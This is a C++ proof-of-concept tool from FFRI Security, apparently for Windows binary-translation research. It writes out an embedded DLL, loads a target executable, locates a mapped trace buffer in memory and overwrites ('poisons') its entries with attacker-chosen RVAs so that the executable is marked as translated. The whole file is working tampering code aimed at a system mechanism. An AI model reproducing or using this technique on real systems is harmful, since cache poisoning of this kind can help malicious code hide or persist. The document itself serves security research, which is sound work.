// (c) FFRI Security, Inc., 2023 / Author: FFRI Security, Inc.
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <optional>
#include <cstdlib>
#include <vector>
#include <string>
#include <utility>
#include <tuple>
#include <filesystem>

#ifdef _M_X64
#include "marker_library64.h"
#elif defined _M_IX86
#include "marker_library32.h"
#else
#error This architecture is not supported.
#endif

struct ModuleIdAndOffset {
	uint32_t id;
	uint32_t offset;
};

struct TraceBuffer {
	uint32_t begin;
	uint32_t numEntries;
	ModuleIdAndOffset modIdAndOffsets[1];
};

void UpdateTimestamp(const char* path) {
	HANDLE hFile = CreateFileA(
		path,
		GENERIC_WRITE | GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (hFile == INVALID_HANDLE_VALUE) {
		std::cerr << "[-] Cannot open file " << path << std::endl;
		return;
	}

	BY_HANDLE_FILE_INFORMATION fi{};
	if (!GetFileInformationByHandle(hFile, &fi)) {
		std::cerr << "[-] Cannot get file information" << std::endl;
		return;
	}

	fi.ftLastWriteTime.dwLowDateTime++;
	if (!SetFileTime(hFile, &fi.ftCreationTime, &fi.ftLastAccessTime, &fi.ftLastWriteTime)) {
		std::cerr << "[-] Cannot set file time" << std::endl;
		return;
	}

	CloseHandle(hFile);
}

std::optional<uint32_t> GetTraceBufferIdx(TraceBuffer* traceBuffer) {
#ifdef _M_X64
	const uint32_t expected[] = {
		0x1000,
		0x1044,
		0x1039,
		0x102f,
		0x1026,
		0x101e,
	};
#elif defined _M_IX86
	const uint32_t expected[] = {
		0x1000,
		0x1041,
		0x1036,
		0x102c,
		0x1023,
		0x101b,
	};
#else
#error This architecture is not supported.
#endif

	for (int i = 0; i < 100; i++) {
		if (traceBuffer->modIdAndOffsets[0 + i].offset == expected[0] &&
			traceBuffer->modIdAndOffsets[1 + i].offset == expected[1] &&
			traceBuffer->modIdAndOffsets[2 + i].offset == expected[2] &&
			traceBuffer->modIdAndOffsets[3 + i].offset == expected[3] &&
			traceBuffer->modIdAndOffsets[4 + i].offset == expected[4] &&
			traceBuffer->modIdAndOffsets[5 + i].offset == expected[5]) {
			return (uint32_t)i;
		}
	}
	return std::nullopt;
}

std::tuple<TraceBuffer*, uint32_t, uint32_t> FindTraceBufferHeuristically() {
	MEMORY_BASIC_INFORMATION mbi = {};
	LPVOID offset = (LPVOID)0x1000;
	while (VirtualQueryEx(GetCurrentProcess(), offset, &mbi, sizeof(mbi))) {
		offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
		if (mbi.AllocationProtect == PAGE_READWRITE &&
			mbi.State == MEM_COMMIT &&
			mbi.Type == MEM_MAPPED) {
			auto idx = GetTraceBufferIdx((TraceBuffer*)mbi.BaseAddress);
			if (idx.has_value()) {
				return {(TraceBuffer*)mbi.BaseAddress, (uint32_t)mbi.RegionSize, idx.value()};
			}
		}
	}
	return { nullptr, 0 , 0};
}

std::vector<uint32_t> GetRvas(int argc, char* argv[]) {
	std::vector<uint32_t> rvas;
	for (int i = 2; i < argc; i++) {
		try {
			rvas.push_back(std::stoi(argv[i], nullptr, 16));
		}
		catch (const std::invalid_argument& s) {
			std::cerr << "[-] Invalid argument is passed " << argv[i] << std::endl;
			std::cerr << s.what() << std::endl;
		}
		catch (...) {
			std::cerr << "[-] Unknown error is thrown" << std::endl;
		}
	}
	return rvas;
}

void DropMarkerLibrary() {
	std::ofstream fout(markerLibraryName, std::ios::binary);
	fout.write((char*)markerLibraryPayload, sizeof(markerLibraryPayload));
}

int main(int argc, char* argv[]) {
	if (argc < 3) {
		std::cerr << "Usage:" << std::endl;
		std::cerr << argv[0] << " <input exe> <rva0> <rva1> ..." << std::endl;
		return EXIT_FAILURE;
	}

	if (!std::filesystem::exists(markerLibraryName)) {
		std::cout << "[+] Dropping " << markerLibraryName << std::endl;
		DropMarkerLibrary();
	}

	const auto rvas = GetRvas(argc, argv);
	std::cout << "[+] Loading target executable" << std::endl;
	const char* inputExe = argv[1];
	auto base = LoadLibraryExA(
		inputExe,
		NULL,
		DONT_RESOLVE_DLL_REFERENCES); // to avoid running DllEntry
	if (!base) {
		std::cerr << "[-] Cannot load " << inputExe << std::endl;
		std::cerr << "[-] GetLastError() " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	std::cout << "[+] Loading MarkerLibrary.dll" << std::endl;
	UpdateTimestamp(markerLibraryName);
	base = LoadLibraryA(markerLibraryName);
	if (!base) {
		std::cerr << "[-] Cannot find " << markerLibraryName << std::endl;
		return EXIT_FAILURE;
	}

	std::cout << "[+] Finding Trace Buffer" << std::endl;
	auto [traceBuffer, traceBufferSize, traceBufferIdx] = FindTraceBufferHeuristically();
	if (!traceBuffer) {
		std::cerr << "[-] Cannot find Trace Buffer" << std::endl;
		return EXIT_FAILURE;
	}

	const auto requiredBufferSize = 8 + sizeof(ModuleIdAndOffset) * rvas.size();
	if (requiredBufferSize > traceBufferSize) {
		std::cerr << "[-] Too many RVAs are specified" << std::endl;
		return EXIT_FAILURE;
	}
	
	std::cout << "[+] Poisoning Trace Buffer" << std::endl;
	const auto targetModId = traceBuffer->modIdAndOffsets[traceBufferIdx].id - 1;
	traceBuffer->begin = 0;
	traceBuffer->numEntries = (uint32_t)rvas.size();
	for (uint32_t i = 0; i < traceBuffer->numEntries; i++) {
		traceBuffer->modIdAndOffsets[i].id = targetModId;
		traceBuffer->modIdAndOffsets[i].offset = rvas[i];
	}

	std::cout << "[+] " << inputExe << " is translated" << std::endl;

	return EXIT_SUCCESS;
}